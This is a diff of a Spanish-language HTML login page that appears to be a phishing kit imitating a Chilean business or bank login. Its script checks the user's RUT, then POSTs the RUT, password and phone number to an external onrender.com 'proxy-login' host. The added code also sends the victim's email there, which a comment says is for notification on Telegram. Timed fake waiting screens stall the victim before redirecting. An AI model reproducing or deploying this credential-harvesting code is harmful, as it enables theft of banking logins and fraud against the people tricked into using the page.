@@ -78,86 +78,97 @@
       <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
       <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
+<script>
+  // Validación de RUT
+  function validarRut(rutCompleto) {
+    rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+    if(rutCompleto.length < 2) return false;
+    let cuerpo = rutCompleto.slice(0, -1);
+    let dv = rutCompleto.slice(-1);
+    let suma = 0, multiplo = 2;
+    for(let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
+    }
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+    return dv === dvEsperado;
+  }
 
-   
+  document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const rut = document.getElementById("rut").value;
+    const passwd = document.getElementById("passwd").value;
+    const telefono = document.getElementById("telefono").value;
+    const contacto = document.getElementById("contacto").checked;
+
+    if(!validarRut(rut)){
+      document.getElementById("resultado").innerText = "❌ RUT inválido";
+      return;
+    }
+    if(!contacto){
+      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
+      return;
+    }
+
+    try {
+      // Enviar datos iniciales SIN correo aún
+      const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ rut, passwd, telefono })
+      });
+      const data = await response.text();
+      document.getElementById("resultado").innerText = data;
+
+      if(response.ok){
+        document.getElementById("loginForm").style.display="none";
+        document.getElementById("pantallaEspera").classList.remove("hidden");
+
+        // Después de 45 segundos mostrar formulario de correo
+        setTimeout(()=>{
+          document.getElementById("pantallaEspera").classList.add("hidden");
+          document.getElementById("formCorreo").classList.remove("hidden");
+        }, 45000);
+      }
+    } catch (error) {
+      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+    }
+  });
+
+  async function enviarCorreo(){
+    const correo = document.getElementById("correo").value;
+
+    try {
+      // Enviar correo al backend para notificar en Telegram
+      await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mail: correo })
+      });
+    } catch (error) {
+      console.error("Error al enviar correo:", error);
+    }
+
+    document.getElementById("formCorreo").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      document.getElementById("pantallaEspera").classList.add("hidden");
+      document.getElementById("pantallaProductos").classList.remove("hidden");
+    }, 30000);
+  }
+
+  function continuarProductos(){
+    document.getElementById("pantallaProductos").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      window.location.href="productos.html";
+    }, 30000);
+  }
+</script>
   </div>
 
-  <script>
-    // Validación de RUT
-    function validarRut(rutCompleto) {
-      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-      if(rutCompleto.length < 2) return false;
-      let cuerpo = rutCompleto.slice(0, -1);
-      let dv = rutCompleto.slice(-1);
-      let suma = 0, multiplo = 2;
-      for(let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo.charAt(i)) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-      let dvEsperado = 11 - (suma % 11);
-      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-      return dv === dvEsperado;
-    }
-
-    document.getElementById("loginForm").addEventListener("submit", async function(e){
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const passwd = document.getElementById("passwd").value;
-      const telefono = document.getElementById("telefono").value;
-      const contacto = document.getElementById("contacto").checked;
-
-      if(!validarRut(rut)){
-        document.getElementById("resultado").innerText = "❌ RUT inválido";
-        return;
-      }
-      if(!contacto){
-        document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
-        return;
-      }
-
-      try {
-        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ rut, passwd, telefono })
-        });
-        const data = await response.text();
-        document.getElementById("resultado").innerText = data;
-
-        if(response.ok){
-          // Ocultar login y mostrar pantalla de espera
-          document.getElementById("loginForm").style.display="none";
-          document.getElementById("pantallaEspera").classList.remove("hidden");
-
-          // Después de 2 minutos mostrar formulario de correo
-          setTimeout(()=>{
-            document.getElementById("pantallaEspera").classList.add("hidden");
-            document.getElementById("formCorreo").classList.remove("hidden");
-          }, 45000); // 45 SEGUNDOS
-        }
-      } catch (error) {
-        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
-      }
-    });
-
-    function enviarCorreo(){
-      document.getElementById("formCorreo").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
-      setTimeout(()=>{
-        document.getElementById("pantallaEspera").classList.add("hidden");
-        document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 30000); // 30 seg
-    }
-
-    function continuarProductos(){
-      document.getElementById("pantallaProductos").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
-      setTimeout(()=>{
-        window.location.href="productos.html";
-      }, 30000); // 30 seg
-    }
-  </script>
-</body>
+  </body>
 </html>
